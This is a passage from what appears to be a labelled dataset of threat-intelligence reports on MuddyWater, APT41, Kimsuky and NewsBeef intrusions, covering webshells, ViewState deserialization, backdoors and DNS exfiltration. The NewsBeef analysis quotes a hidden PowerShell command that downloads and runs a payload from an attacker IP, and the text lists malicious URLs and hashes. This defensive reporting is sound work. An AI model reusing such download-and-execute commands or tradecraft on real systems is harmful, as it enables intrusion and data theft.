privilege vulnerability exists when an attacker establishes a vulnerable Netlogon secure channel connection to a domain controller, using the Netlogon Remote Protocol (MS-NRPC), aka 'Netlogon Elevation of Privilege Vulnerability'.After exploiting the vulnerability in the exchange server, a WebShell will be uploaded to the compromised server. During our IR investigation, we identified a WebShell named ‘LiveIdError.aspx’which indicates this specific vulnerability. Note that this is the only known vulnerability through which this WebShell is dropped. This WebShell was used to download another ASP.NET WebShell as a payload. The second WebShell is named ‘IndexExchangeManagment.aspx’ (Note the misspelled ‘management’ word):The attacker required privileged credentials to successfully execute the exploitation. We assess that the attacker stole these credentials by deploying Mimikatz. Moreover, we identified a GitHub profile with the explanation of the execution of the vulnerability. This profile is also based in Iran. Using this WebShell, a zip file is dropped to the victim’s network. The file archived in the zip is a portable executable file named SSF.exe. This file was also reported in SecureWorks’ report as one of the payloads MuddyWater installs in compromised servers19. This tool is based on a publicly available open-source toolkit20 that enables Secure Socket Funneling (SSF) between the C2 and the remote compromised server or between two machines that were compromised in the victim’s network. The tool allows the attacker to send data from multiple sockets over TCP or UDP ports through a single secure TLS tunnel. In our analysis, we found out that SSF.mx is a variant of the SSF tool from GitHub. This variant also allows the attacker to execute shell commands across the network (for lateral movement or between internal machines that were encrypted). Note that after the installation of PowGoop loader, we identified attempts to delete SSF.mx files from the network. After gaining access to the victim’s network, the attacker started conducting reconnaissance. We identified queries for Domain Administrator accounts and enumeration attempts for specific domains in the network. Using the SSF.mx secure tunnel, the attacker spread the PowerShell scripts and executes them. We identified the distribution of the PowGoop loader to the system. A scheduled task is also generated by the attacker. This task would take part in running GoopDate.dll (PowGoop).The second vector is more in line with common MuddyWater vectors. As mentioned, there is a possibility that Vector A was utilized only after initial access was obtained using Vector B. In the beginning of the delivery stage, the target receives a link to their corporate email, joined by a link to a file storing service. Through this service the victim encounters a ZIP containing the infected file：From the malicious macro embedded in the excel file we can derive that the file used in the attack was previously a test file. The macro is divided into different parts:Each part of code is encoded in different ways, including ASCII, XOR, and base64. Following is the code before decoding and decrypting:With this component, 2 pieces of PowerShell code are downloaded to the computer. After that, a Scheduled Task is automatically run, to activate WScript:This PowerShell code communicates with a breached server from which the group downloads malicious files used as the malware’s “Stage 2”. The second server is a C2 server used as storage for additional files, not necessarily breached. The communication in this instance is carried out through a file named dl which contains PowerShell commands. Following is the command that allows running this file (can also be seen in the code): Communications to the server are carried out with GET commands in TCP format (under port 443). Following is the specific command to download the file:A VBS file called db.vbs is downloaded from the server and stored in the Public folder. The aforementioned file is an additional PowerShell command, which extracts a third ps1 file. This file, called putty.ps1, allows for communication between the second C2 server in this infrastructure and the infected machine, as preparation for the downloading of the malware to the machine. The aforementioned C2 server is a webhook (Reverse API), from which the attackers download a specific file stored at the site. Following are three additional webhooks (aside from the webhook in the screenshot), which we have identified throughout the investigation:The Covicli backdoor will be downloaded from this webhook to the victim’s compromised server. Similar to the Excel vector, an archive file (mainly ZIP) was sent to an employ of the organization we investigated. The file accordingly is in Hebrew, and is about a loan. Here is a screenshot of the PDF file: Similarly, to files used in previous campaigns, once the malicious executable is running, two files are unloaded to the machine: a legitimate PDF and a malicious DLL. It appears that the attackers have advanced their security system avoidance techniques, implementing several camouflaging components such as ones designed to refrain from triggering Windows Defender. The attackers manage to bypass many identification systems, making technical investigations much more difficult. Additionally, the use of Hewlett-Packard MFP was identified, in place of the NSIS executable. In the meantime, another folder will be created in the path:To gain persistency, the malicious file will be copied to the %temp% folder followed by its deletion from the original folder. Another file will be copied to the Startup folder with a PDF’s icon. The attacker will also create a scheduled task for a PowerShell that runs a file named xca_db_stat.exe. Then, the attacker will create 2 registry keys on the following path: From the C2, a dll file named SSLeay32.dll will be downloaded. This file is a modifiedOpenSSL dynamic library, which was modified for the hacker’s purposes. We identified the following PDB path:Due to the appearance of the word Covic, and the original name given to the file (CLI.dll) by the threat actor, we named this backdoor Covicli. This file also contains a module version ID of .net4: The attacker uses the following command line in order to communicate with the C2 over OpenSSL:This server’s Header displays the server’s location as if it is associated with the Azerbaijani government. The result of this is diverging access to the server through port 80 but without the path to the following site：The malware itself generates a scheduled task named Updater (expanded further on) that communicates with the server using PowerShell (on port 80), much like MoriAgent. The PowerShell will run the following commands: ipconfic, arp, net. If the connection to the C2 was successful, the PowGoop loader will be installed in the system. After the installation, the attacker tried to delete SSF.mx task from the network by using the following command:This is a slightly different variant originally found in the report by Palo Alto (which reported about 4 components). The loader from PaloAlto report was split into two components. The second loader found in this attack matches the functionality of the only loader described in Palo Alto’s report. This suggests it was used as a technique by the attacker to obfuscate part of the loader that was detected by antivirus scanners. The GoogleUpdate.exe used with the malware is a legitimate binary, but it is vulnerable to a DLL-sideloading attack. One of Google Update’s dependencies is a DLL named goopdate86.dll which then has a dependency of goopdate.dll. The malware works by replacing the original goopdate.dll by a malicious DLL containing the same filename. By replacing the legitimate goopdate.dll with a malicious one, GoogleUpdater.exe ends up loading the malicious payload into memory. The PowGoop malware works as follows:In both cases, the PowGoop loader payload was downloaded from the C2 (which we attributed to MuddyWater based on unique server signature). Once this payload is run successfully, a Thanos Ransomware payload can be downloaded to the server, which is compatible with the scenario PaloAlto described in their report.“MuddyWater” group is one of the most active Iranian APTs, targeting Israeli organizations since at least 2018. Over the past few years, we have uncovered a number of “social engineering” attack scenarios conducted by the group. campaigns by the group have targeted individuals, companies, organizations, and governments. We also identified attacks by the group targeting internal Iranian actors. The group’s campaigns may be categorized to three distinct periods and attack scenarios (ordered chronologically): It is possible that due to the advancing confrontation with Israel, and simply developments of attack methods over time, that the group had undergone an organizational\\strategic evolution (or simply received new instructions) into destructive attacks. During ClearSky’s investigation we have located several additional files and C2s that operate as part of the attack infrastructure. Once the tool is deployed, keys are exchanged, and persistence on the network is established, the group generates communications with its C2, this apparently to install a malware that appears to be ransomware. In light of the exposure of Thanos, ClearSky assesses that the group is attempting to employ destructive attacks (the likes of the NotPetya attack from 2017). MuddyWater updated their TTPs, as well as their level of sophistication, mainly during 2020. We assess that during this year MuddyWater began to work for the IRGC , acting as a contractor for additional cyber security operations. Since the group was discovered a few years ago, their priority was only CNE (espionage), against private organizations, government organizations, ministries, and agencies. The group relied mostly on social engineering methods. For example, in late 2019 we discovered an attempt to attack a journalist that worked for a prominent US media outlet. In the first stage of the attack, MuddyWater emailed the victim without sending any file or link. The group tried to schedule a physical meeting with the victim, and only after he made it clear that he cannot have the meeting, the group sent him a malicious file. Unlike this past TTP, we identified exploitation of vulnerabilities as the major injection vector in the current campaign. We assess that the level of sophistication inherent to the group is high. Israel and other countries that are under the threat of this group have to harden their network and be prepared for more camouflaged destructive campaigns. This time, the attack was prevented, and therefore we cannot prove that MuddyWater installed PowGoop in the victim’s network for a destructive attack. However, we adopted the assessment by PaloAlto regarding the purpose of this loader. MuddyWater’s capabilities are not extremely unique, and this attack seems like an escalation of their aggression level, rather than a completely new form of attack (as was the case in the reported Fox Kitten attack). However, it is noteworthy that in this attack the previous infiltration into the systems of the Israeli organizations was used as to gain trust and thus provide a basis for further attacks. The tension between Israel and Iran in the cyber domain might be an explanation for this evolution. This tension began a decade ago, with the Stuxnet malware that was attributed to Israel and the US, and the Iranian response. One of the retaliations of this attack was the mentioned destructive Shamoon attack which was attributed to another Iranian threat actor – APT33. This year displayed a new phase of this tension, beginning with the uncovering of the Fox Kitten operation23 and the alleged attack by Iran against the water authority of Israel. The retaliation for Ghasem Soleimani’s death is another possible explanation for the attack. The assassination caught Iran off-guard. On the same day, the wiper ‘Dustman’ was exposed. We assess that another potential explanation for Operation Quicksand is retaliation for the assassination, and the timing was dependent on the toolset the Iranian threat actor possessed at the time.\n\n\n",

        "explain": "In May 2021 Mandiant responded to an APT41 intrusion targeting a United States state government computer network. This was just the beginning of Mandiant’s insight into a persistent months-long campaign conducted by APT41 using vulnerable Internet facing web applications as their initial foothold into networks of interest. APT41 is a prolific Chinese state-sponsored espionage group known to target organizations in both the public and private sectors and also conducts financially motivated activity for personal gain. In this blog post, we detail APT41’s persistent effort that allowed them to successfully compromise at least six U.S. state government networks by exploiting vulnerable Internet facing web applications, including using a zero-day vulnerability in the USAHerds application (CVE-2021-44207) as well as the now infamous zero-day in Log4j (CVE-2021-44228). While the overall goals of APT41's campaign remain unknown, our investigations into each of these intrusions has revealed a variety of new techniques, malware variants, evasion methods, and capabilities. Although APT41 has historically performed mass scanning and exploitation of vulnerabilities, our investigations into APT41 activity between May 2021 and February 2022 uncovered evidence of a deliberate campaign targeting U.S. state governments. During this timeframe, APT41 successfully compromised at least six U.S. state government networks through the exploitation of vulnerable Internet facing web applications, often written in ASP.NET. In most of the web application compromises, APT41 conducted .NET deserialization attacks; however, we have also observed APT41 exploiting SQL injection and directory traversal vulnerabilities. In the instance where APT41 gained access through a SQL injection vulnerability in a proprietary web application, Mandiant Managed Defense quickly detected and contained the activity; however, two weeks later APT41 re-compromised the network by exploiting a previously unknown zero-day vulnerability in a commercial-off-the-shelf (CoTS) application, USAHerds. In two other instances, Mandiant began an investigation at one state agency only to find that APT41 had also compromised a separate, unrelated agency in the same state. APT41 was also quick to adapt and use publicly disclosed vulnerabilities to gain initial access into target networks, while also maintaining existing operations. On December 10th, 2021, the Apache Foundation released an advisory for a critical remote code execution (RCE) vulnerability in the commonly used logging framework Log4J. Within hours of the advisory, APT41 began exploiting the vulnerability to later compromise at least two U.S. state governments as well as their more traditional targets in the insurance and telecommunications industries. In late February 2022, APT41 re-compromised two previous U.S. state government victims. Our ongoing investigations show the activity closely aligns with APT41's May-December 2021 activity, representing a continuation of their campaign into 2022 and demonstrating their unceasing desire to access state government networks. A timeline of representative intrusions from this campaign can be seen in Figure 1. The goals of this campaign are currently unknown, though Mandiant has observed evidence of APT41 exfiltrating Personal Identifiable Information (PII). Although the victimology and targeting of PII data is consistent with an espionage operation, Mandiant cannot make a definitive assessment at this time given APT41’s history of moonlighting for personal financial gain. APT41 has primarily used malicious ViewStates to trigger code execution against targeted web applications. Within the ASP.NET framework, ViewState is a method for storing the application’s page and control values in HTTP requests to and from the server. The ViewState is sent to the server with each HTTP request as a Base64 encoded string in a hidden form field. The web server decodes the string and applies additional transformations to the string so that it can be unpacked into data structures the server can use. This process is known as deserialization. Insecure deserialization of user-supplied input can result in code execution. ASP.NET has several insecure deserialization providers, including the one used for ViewStates: ObjectStateFormatter. To prevent a threat actor from manipulating the ViewState and taking advantage of the insecure deserialization provider, the ViewState is protected by a Message Authentication Code (MAC). This MAC is a cryptographically signed hash value that the server uses to ensure that the ViewState has not been tampered with, possibly to trigger code execution. The integrity of the ViewState depends on the application’s machineKey remaining confidential. The machineKey is stored on the application server in a configuration file named web.config. A threat actor with knowledge of the machineKey can construct a malicious ViewState and then generate a new and valid MAC that the server accepts. With a valid MAC, the server will then deserialize the malicious ViewState, resulting in the execution of code on the server. Publicly available tools such as YSoSerial.NET exist to construct these malicious ViewStates. This is precisely how APT41 initiated their campaign in May 2021. In June 2020, one year before APT41 began this campaign, Mandiant investigated an incident where APT41 exploited a directory traversal vulnerability specifically to read the web.config file for a vulnerable web application on a victim web server. APT41 then used the machineKey values from the web.config file to generate a malicious ViewState payload for a deserialization exploit. Mandiant did not identify how APT41 originally obtained the machineKey values for the proprietary application exploited in May 2021 or the USAHerds application, which was first exploited in July 2021. However, it is likely that APT41 obtained the web.config file through similar means. To craft malicious ViewStates, APT41 relied on the publicly available Github project YSoSerial.NET. In order to successfully load arbitrary .NET assemblies into memory, APT41 set the DisableActivitySurrogateSelectorTypeCheck property flag to true within the ConfigurationManager.AppSettings class of the running application via the ViewState payload. APT41 subsequently loaded .NET assemblies into memory using additional YSoSerial payloads configured to write webshells to a hardcoded filepath on disk.Figure 4 shows an example JScript webshell deployed through a malicious ViewState object by APT41 which utilizes Code Page 936 for the Chinese Simplified keyboard language.For additional information regarding deserialization exploits and our new hunting rule generation tool ‘HeySerial’, read our blog post, Now You Serial, Now You Don’t — Systematically Hunting for Deserialization Exploits.In three investigations from 2021, APT41 exploited a zero-day vulnerability in the USAHerds web application. USAHerds is a CoTS application written in ASP.NET and used by 18 states for animal health management. The vulnerability in USAHerds (CVE-2021-44207) is similar to a previously reported vulnerability in Microsoft Exchange Server (CVE-2020-0688), where the applications used a static validationKey and decryptionKey (collectively known as the machineKey) by default. As a result, all installations of USAHerds shared these values, which is against the best practice of using uniquely generated machineKey values per application instance. Generating unique machineKey values is critical to the security of an ASP.NET web application because the values are used to secure the integrity of the ViewState. Mandiant did not identify how APT41 originally obtained the machineKey values for USAHerds; however, once APT41 obtained the machineKey, they were able to compromise any server on the Internet running USAHerds. As a result, there are potentially additional unknown victims.The most recent APT41 campaign began shortly after the release of CVE-2021-44228 and its related proof-of-concept exploits in December 2021. Exploiting this vulnerability, also known as Log4Shell, causes Java to fetch and deserialize a remote Java object, resulting in potential code execution. Similar to their previous web application targeting, APT41 continued to use YSoSerial generated deserialization payloads to perform reconnaissance and deploy backdoors. Notably, APT41 deployed a new variant of the KEYPLUG backdoor on Linux servers at multiple victims, a malware sub-family we now track as KEYPLUG.LINUX. KEYPLUG is a modular backdoor written in C++ that supports multiple network protocols for command and control (C2) traffic including HTTP, TCP, KCP over UDP, and WSS. APT41 heavily used the Windows version of the KEYPLUG backdoor at state government victims between June 2021 and December 2021, thus the deployment of a ported version of the backdoor closely following the state government campaign was significant. After exploiting Log4Shell, APT41 continued to use deserialization payloads to issue ping commands to domains, a technique APT41 frequently used at government victims months prior. An example ping command is shown in Figure 5.Upon gaining access to a target environment, APT41 performed host and network reconnaissance before deploying KEYPLUG.LINUX to establish a foothold in the environment. Sample commands used to deploy KEYPLUG.LINUX can be seen in Figure 6.The updated tradecraft and new malware continue to show APT41 is a highly adaptable and resourceful actor. In this section, we detail the most pertinent post-compromise techniques. After gaining initial access to an internet-facing server, APT41 performed extensive reconnaissance and credential harvesting. A common tactic seen is the deployment of a ConfuserEx obfuscated BADPOTATO binary to abuse named pipe impersonation for local NT AUTHORITY\\SYSTEM privilege escalation. Once APT41 escalated to NT AUTHORITY\\SYSTEM privileges, they copied the local SAM and SYSTEM registry hives to a staging directory for credential harvesting and exfiltration. APT41 has additionally used Mimikatz to execute the lsadump::sam command on the dumped registry hives to obtain locally stored credentials and NTLM hashes. APT41 also conducted Active Directory reconnaissance by uploading the Windows command-line tool dsquery.exe (MD5: 49f1daea8a115dd6fce51a1328d863cf) and its associated module dsquery.dll (MD5: b108b28138b93ec4822e165b82e41c7a) to a staging directory on the compromised server. Figure 7 shows multiple dsquery commands used to enumerate various Active Directory objects within the environment.During the early stage of one U.S. state government intrusion, Mandiant identified a new malware family used by APT41 we track as DUSTPAN. DUSTPAN is an in-memory dropper written in C++ that leverages ChaCha20 to decrypt embedded payloads. Different variations of DUSTPAN may also load and execute a payload from a hard-coded filepath encrypted in the binary. DUSTPAN is consistent with the publicly named StealthVector, reported by Trend Micro in August 2021. During the intrusion, DUSTPAN was used to drop a Cobalt Strike BEACON backdoor.APT41 continues to leverage advanced malware in their existing toolkit, such as the DEADEYE launcher and LOWKEY backdoor, with added capabilities and anti-analysis techniques to hinder investigations. During a recent intrusion Mandiant identified a new malware variant, DEADEYE.EMBED, contained in an Alternate Data Stream of a local file. DEADEYE.EMBED variants embed the payload inside of the compiled binary rather than appended to the overlay at the end of the file, as seen in DEADEYE.APPEND. APT41 commonly packages their malware with VMProtect to slow reverse engineering efforts. During multiple U.S. state government intrusions, APT41 incorporated another anti-analysis technique by chunking a VMProtect packaged DEADEYE binary into multiple sections on disk. Breaking the binary into multiple files reduces the chance that all samples can be successfully acquired during a forensic investigation. Common file naming conventions used by APT41 when deploying DEADEYE on victim hosts can be seen in Figure 8.In addition to separating their VMProtect packaged malware on disk, APT41 changed the standard VMProtect section names (.vmp) to UPX section names (.upx). By doing so, the malware could evade basic hunting detections that flag binaries packaged with VMProtect. During Log4j exploitation, APT41 similarly chunked a KEYPLUG.LINUX binary into four separate files named “xaa”, ” xab”, ” xac”, and ”xad”. APT41 also packaged the KEYPLUG.LINUX binary with VMProtect and used UPX section names. This technique is very low in prevalence across our malware repository, and even lower in prevalence when searching across ELF files. APT41 also updated the DEADEYE execution guardrail capabilities used during the campaign. Guardrailing is a technique used by malware to ensure that the binary only executes on systems that the threat actor intended. DEADEYE samples from older campaigns used the victim computer’s volume serial number but they have since been updated to use the hostname and/or DNS domain during the U.S. state government campaign. To acquire the local computer’s hostname and DNS domain, DEADEYE executes the WinAPI functions GetComputerNameA and/or GetComputerNameExA and provides it as input for a generated decryption key.APT41 continues to leverage advanced tradecraft to remain persistent and undetected. In multiple instances, the Windows version of the KEYPLUG backdoor leveraged dead drop resolvers on two separate tech community forums. The malware fetches its true C2 address from encoded data on a specific forum post. Notably, APT41 continues to update the community forum posts frequently with new dead drop resolvers during the campaign. APT41 has historically used this unique tradecraft during other intrusions to help keep their C2 infrastructure hidden. To persist execution of DEADEYE, APT41 has leveraged the schtasks /change command to modify existing scheduled tasks that run under the context of SYSTEM. APT41 commonly uses the living off the land binary (lolbin) shell32.dll!ShellExec_RunDLLA in scheduled tasks for binary execution, such as the example shown in Figure 10.APT41 has leveraged the following Windows scheduled tasks for persistence of DEADEYE droppers in U.S. state government intrusions:Another technique APT41 used to launch malware is through the addition of a malicious import to the Import Address Table (IAT) of legitimate Windows PE binaries. As a result, once the legitimate binary is executed, it will load the malicious library and call its DllEntryPoint. A modified IAT of a legitimate Microsoft HealthService.exe binary can be seen in Figure 11.APT41 continues to tailor their malware to victim environments through their stealthy passive backdoor LOWKEY.PASSIVE. During one intrusion, APT41 exploited a USAHerds server and subsequently executed DEADEYE.APPEND which dropped LOWKEY.PASSIVE in-memory. The identified LOWKEY.PASSIVE sample listened for incoming connections that request either of the following URL endpoints:APT41 frequently configured LOWKEY.PASSIVE URL endpoints to masquerade as normal web application traffic on an infected server.APT41 has substantially increased their usage of Cloudflare services for C2 communications and data exfiltration. Specifically, APT41 leveraged Cloudflare Workers to deploy serverless code accessible through the Cloudflare CDN which helps proxy C2 traffic to APT41 operated infrastructure. At multiple victims, APT41 issued ping commands where the output of a reconnaissance command was prepended to subdomains of Cloudflare proxied infrastructure. Once the ping command was executed, the local DNS resolver attempted to resolve the fabricated domain containing the prepended command output. The forward DNS lookup eventually reached the primary domain's Cloudflare name servers, which were unable to resolve an IP address for the fabricated domain. However, the DNS activity logs of the attacker-controlled domain recorded the DNS lookup of the subdomain, allowing the group to collect the reconnaissance command output.In Figure 14, APT41 issued a command to find the volume serial number of the system, which has historically been used as the decryption key for DEADEYE payloads.In this last example, the command prints the length of the file syslog_6-1.dat, likely to ensure it has been fully written to disk prior to combining the multiple files into the full malicious executable. APT41 leveraged the aforementioned technique for further data exfiltration by hex encoding PII data and prepending the results as subdomains of the attacker-controlled domain. The resulting DNS lookups triggered by the ping commands would be recorded in the activity logs and available to APT41. APT41’s continued usage of Cloudflare services is further exemplified in recently developed KEYPLUG samples. Mandiant identified a unique capability added to KEYPLUG that leverages the WebSocket over TLS (WSS) protocol for C2 communication. According to Cloudflare, WebSocket traffic can be established through the Cloudflare CDN edge servers, which will proxy data through to the specified origin server. KEYPLUG includes a hardcoded one-byte XOR encoded configuration file that lists the specific communication protocol, servers, and additional settings. After KEYPLUG decodes the hardcoded configuration file at runtime, it will parse the configuration to determine the appropriate network protocol and servers to use for command and control. After the configuration is parsed, KEYPLUG randomly chooses a CIDR block from the list then randomly chooses an IP address within the CIDR block based on the current tick count of the infected computer. Figure 16 details an example configuration file identified during a recent U.S. state government intrusion.The CIDR blocks listed in Figure 16 are Cloudflare CDN associated infrastructure that will redirect the WSS connection to the malicious domain afdentry[.]workstation[.]eu[.]org. Figure 17 is an example HTTP request sent by KEYPLUG to initiate and upgrade to the WSS protocol using Cloudflare infrastructure.We notified Cloudflare of this malicious activity and they took prompt action to disrupt communications to the malicious infrastructure. APT41’s increased usage of Cloudflare services indicates a desire to leverage Cloudflare’s flexibility and deter identification and blocking of their true C2 servers.APT41's recent activity against U.S. state governments consists of significant new capabilities, from new attack vectors to post-compromise tools and techniques. APT41 can quickly adapt their initial access techniques by re-compromising an environment through a different vector, or by rapidly operationalizing a fresh vulnerability. The group also demonstrates a willingness to retool and deploy capabilities through new attack vectors as opposed to holding onto them for future use. APT41 exploiting Log4J in close proximity to the USAHerds campaign showed the group’s flexibility to continue targeting U.S state governments through both cultivated and co-opted attack vectors. Through all the new, some things remain unchanged: APT41 continues to be undeterred by the U.S. Department of Justice (DOJ) indictment in September 2020.\n\n\n",

        "original_label": "true",
        "label": "true",
        "explain": "In cyberattacks against the US, South Korea, and Japan, the group (aka APT43 or Thallium) is using advanced social engineering and cryptomining tactics that set it apart from other threat actors. Cybercriminal group Kimsuky has evolved into a full-fledged, persistent threat, carrying out “unusually aggressive” social-engineering attacks aimed at gathering intelligence, and stealing and laundering cryptocurrency to support the North Korean government. Researchers from Mandiant have tracked a number of changes to the activity of the group, which they call APT43, in a series of rapid-fire attacks against targets in the US, South Korea, and Japan, they revealed in a report published today. Kimsuky, also tracked as Thallium, has been on various researchers' radar screens since 2018, and its previous activity has been widely reported. In earlier attacks, the group mainly focused on conducting cyber espionage against research institutions, geo-political think tanks, and — particularly during the height of the pandemic — pharmaceutical companies. The group typically used spear-phishing campaigns to lure in users and then installed various public and non-public malware, including spyware, onto targeted devices, which were often Android-based smartphones. In fact, Kimsuky was identified as recently as earlier this month leveraging malicious Chrome browser extensions and Android app-store services to target individuals conducting research on the inter-Korean conflict. Now, however, Mandiant researchers have found that APT43 is evolving in several ways. For one, the group is now following in the shoes of other North Korean APTs and branching out beyond mere cyber espionage to steal cryptocurrency, the researchers have found. In addition to using the ill-gotten currency to fund the regime of Kim Jong-un, as other groups do, APT43 also uses it to bolster its own activities, they said. The group is even going the extra step of laundering the crypto through legitimate cloud-mining services so it comes out as clean currency and is difficult to track — an activity that might be used by other groups, but has flown under the radar until now, the researchers said. “The washing of funds and the 'how' has been the missing piece of the equation,” notes Michael Barnhart, Mandiant principal analyst at Google Cloud. “We have indications that APT43 utilizes specific hash rental services to launder these funds by mining for different cryptocurrencies.” For a small fee, these services provide hash power, which APT43 uses to mine cryptocurrency to a wallet selected by the buyer without any blockchain-based association to the buyer's original payments. This allows the APT to use stolen funds to mine for a different cryptocurrency, the researchers said. By spending very little, threat actors walk away with untracked, clean currency to do as they wish, Barnhart explains. Moreover, APT43 — while technologically unsophisticated — relies on advanced and persistent social-engineering tactics in which threat actors create convincing fake personas and exhibit patience in building relationships with targets over several weeks without using malware, the researchers said. “I've never seen an APT quite as successful with such novel techniques,” Barnhart notes. “They pretend to be subject-matter experts or reporters and ask targeted questions — often with the promise of quoting the victim in a report or news article — and successfully gain feedback.” Indeed, in some instances, attackers successfully convinced targeted victims to send over proprietary, geopolitical analysis and research without deploying malware at all, the researchers said. This deviates from standard procedure for most threat groups, allowing APT43 to expend little effort or resources in building malware and gaining the information they are seeking in a low-fi way — by merely asking victims for it, Barnhart notes. APT43 has shifted its targets, and the malware it uses, in campaigns over the years in response to the demands of the North Korean government and the cyberespionage activities it requires of the group, according to Mandiant. “APT43 ultimately modifies its targeting and tactics, techniques, and procedures (TTPs) to suit its sponsors, including carrying out financially-motivated cybercrime as needed to support the regime,” the researchers said in the report. For example, prior to October 2020, the group primarily targeted US and South Korean government offices, diplomatic organizations, and think tank-related entities with a stake in foreign policy and security issues affecting the Korean peninsula. Over the next year, however, the group shifted its focus to COVID-19 response efforts in North Korea by targeting health-related verticals and pharmaceutical companies in South Korea, the US, Europe, and Japan. One notable difference that has emerged between the group and other North Korean threat actors is a recent shift to expand, targeting “everyday users” based on “the sheer velocity and volume of attacks,” says Joe Dobson, Mandiant principal analyst. “By spreading their attack out across hundreds, if not thousands, of victims, their activity becomes less noticeable and harder to track than hitting one large target,“ he says. ”Their pace of execution, combined with their success rate, is alarming.” APT43 is aiming its high-volume activity at entities and organizations in government, business services, and manufacturing as well as think tanks and organizations in education and research related to geopolitical and nuclear policy in the US, South Korea, and Japan, the researchers said. Given its advanced social-engineering tactics and tendency to go after both specific individuals and wider-net targets, researchers advised organizations that may be at risk to share with their employees “a greater understanding of cyber hygiene and heightened awareness,” Barnhart says. “It's important to make personnel aware of this threat actor's TTPs,” Barnhart says. He adds that the APT's spoofed emails are highly convincing, which makes them difficult to spot, even for savvy users; thus, organizations at risk should be on high alert.\n\n\n",

        "explain": "Recently, the United States Cyber Command (USCYBERCOM Malware Alert @CNMF_VirusAlert) highlighted several VirusTotal uploads of theirs – and the executable objects relating to 2016 – 2017 NewsBeef/APT33 activity are interesting for a variety of reasons. Before continuing, it’s important to restate yet again that we defend customers, and research malware and intrusions, regardless of their source. Accordingly, subscribers to our private APT intelligence reports receive unique and extraordinary data on the significant activity and campaigns of over 100 APTs from all over the world, including this 2016-2017 NewsBeef /APT33 activity. USCYBERCOM’s VirusTotal executable object uploads appeared in our January 2017 private report “NewsBeef Delivers Christmas Presence”, an examination of a change in the tactics used in spear-phishing and watering hole attacks against Saudi Arabian targets. Two files uploaded by USCYBERCOM are of particular interest. These were first seen Dec 2016 and Jan 2017: MD5: d87663ce6a9fc0e8bc8180937b3566b9, served as jquerycode-download[.]live/flashplayer23pp_xa_install.exe jquerycode-download[.]live/chrome_update.exe Detected as BSS:Exploit.Win32.Generic, Trojan-Downloader.Win32.Powdr.a, Trojan-Downloader.MSIL.Steamilik.zzo MD5: 9b1a06590b091d300781d8fbee180e75, served as jquerycode-download[.]live/citrixreceiver.exe jquerycode-download[.]live/citrixcertificate.exe ntg-sa[.]com/downloads/citrix_certificate.exe Detected as BSS:Exploit.Win32.Generic, Trojan-Downloader.PowerShell.Agent.ah, DangerousObject.Multi.Generic In order to share insight into Cyber Command’s highlighted malware and its context, some of our private report’s content will be re-written here. The January 2017 report followed up on other private reports published on the group’s BeEF-related activity in 2015 and 2016. All of them cover a thread of mid-2015 activity continuing into 2016, then resetting and advancing in 2016 and into 2017. Bear in mind that regardless of current leaks, which do not always present exhaustive information on group participants, activity from the region has had multiple overlaps and presents a confusion of internal dynamics… Examination of a change in tactics used in spearphishing and watering hole attacks against Saudi Arabian targets The NewsBeef APT previously engaged in long-term, elaborate social engineering schemes that take advantage of popular social network platforms. Previous analysis of the NewsBeef APT indicates that the group focuses on Saudi Arabian (SA) and Western targets, and lacks advanced offensive technology development capabilities. In previous campaigns, NewsBeef relied heavily on its namesake technology, the Browser Exploitation Framework (BeEF). However, in the summer of 2016, the group deployed a new toolset that includes macro-enabled Office documents, PowerSploit, and the Pupy backdoor. The most recent NewsBeef campaign uses this toolset in conjunction with spearphishing emails, links sent over social media/standalone private messaging applications, and watering hole attacks that leverage compromised high-profile websites (some belonging to the SA government). The group changed multiple characteristics year over year – tactics, the malicious JavaScript injection strategically placed on compromised websites, and command and control C2 infrastructure.The NewsBeef campaign is divided into two main attack vectors, spearphishing and strategic web compromise (watering hole) attacks. The group’s spearphishing component uses malicious, macroenabled, Microsoft Office documents that deliver PowerShell scripts. The scripts download poisoned installers (e.g. Flash, Citrix Client, and Chrome) from an online presence (in at least one case, the group spoofed a legitimate, well-known IT services organization). Once the installer is downloaded to a victim machine, it runs PowerSploit scripts that in turn download and execute a full-featured Pupy backdoor. On December 25, 2016, the NewsBeef APT stood up a server to host a new set of Microsoft Office documents (maintaining malicious macros and PowerShell scripts) to support its spear-phishing operations. The group sent these documents (or links to them) to targets via email, and over social network and standalone messaging clients. To compromise websites and servers, the group identified vulnerable sites and injected obfuscated JavaScript that redirected visitors to NewsBeef-controlled hosts (which tracked victims and served malicious content). These compromised servers include Saudi Arabian government servers and other high-value organizational identities relevant to their targets. The majority of NewsBeef targets that our researchers have observed are located in SA. Targeting profiles include:The bulk of the targets were affected through strategic web compromises, especially via compromised government servers. However, Kaspersky Security Network (KSN) records also contain links that victims clicked from the Outlook web client “outlook.live.com” as well as attachments arriving through the Outlook desktop application. This behavior falls in line with previous NewsBeef operations, where the group used other standalone messaging clients to send malicious links. Interestingly, NewsBeef set up its server using the hosting provider “Choopa, LLC, US”, the same hosting provider that the group used in attacks over the summer of 2016. The domain “ntg-sa[.]com” appears to be an attempt by the NewsBeef actor to spoof the legitimate Saudi IT services organization, “National Technology Group” (NTG) at, “ntg.com[.]sa”. The malicious documents served at the spoofed website are shown below: NTG is a legitimate company that provides IT services and support to SA government organizations and communications firms (as well as international financial groups and retailers), making it a high-value identity. Spoofing the identity of an IT service provider is a particularly important asset to threat actors that can abuse the inherent trust of IT organizations to push software (which may appear suspicious if served from another source). NTG’s IT focus and client list likely aided NewsBeef’s delivery of malicious PowerShell-enabled Office documents and poisoned installers. In December 2016, the following active URLs were served from the spoofed NTG identity. All of the poisoned installers are technologies that an IT support service may be expected to deliver. hxxps://ntg-sa[.]com/Downloads/flashplayer23pp_xa_install.exe hxxps://ntg-sa[.]com/Downloads/Citrix_Certificate.exe hxxps://ntg-sa[.]com/Downloads/Chrome_Update.exe In this scenario, the poisoned Flashplayer, Citrix, or Chrome installer drops the file “install.bat”. The batch file runs the PowerShell command: powershell.exe -w hidden -noni -nop -c “iex(New-Object System.Net.WebClient).DownloadString(‘http://139.59.46[.]154:3485/eiloShaegae1′) The command downloads “eiloShaegae1”, another PowerShell downloader script. This second PowerShell downloader script downloads and runs the payload; a PowerSploit ReflectivePEInjection script, “hxxp://139.59.46[.]154:3485/IMo8oosieVai”. The script maintains and then decodes a base64 string. This base64 string, is the Pupy backdoor DLL, which is loaded and run in-memory, never touching the disk. This Pupy backdoor immediately communicates with 139.59.46[.1]54 over obfs3, posting collected system data and retrieving commands. This selection of “The Threebfuscator” for command and control (C2) communications is interesting, because it is an obfuscating protocol used to mask Tor communications. It is possible that the use of obfs3 indicates the attackers’ understanding of its effectiveness against outbound connection monitoring. Another notable spoofed domain used during this campaign is the “maps-modon[.]club” domain. The domain 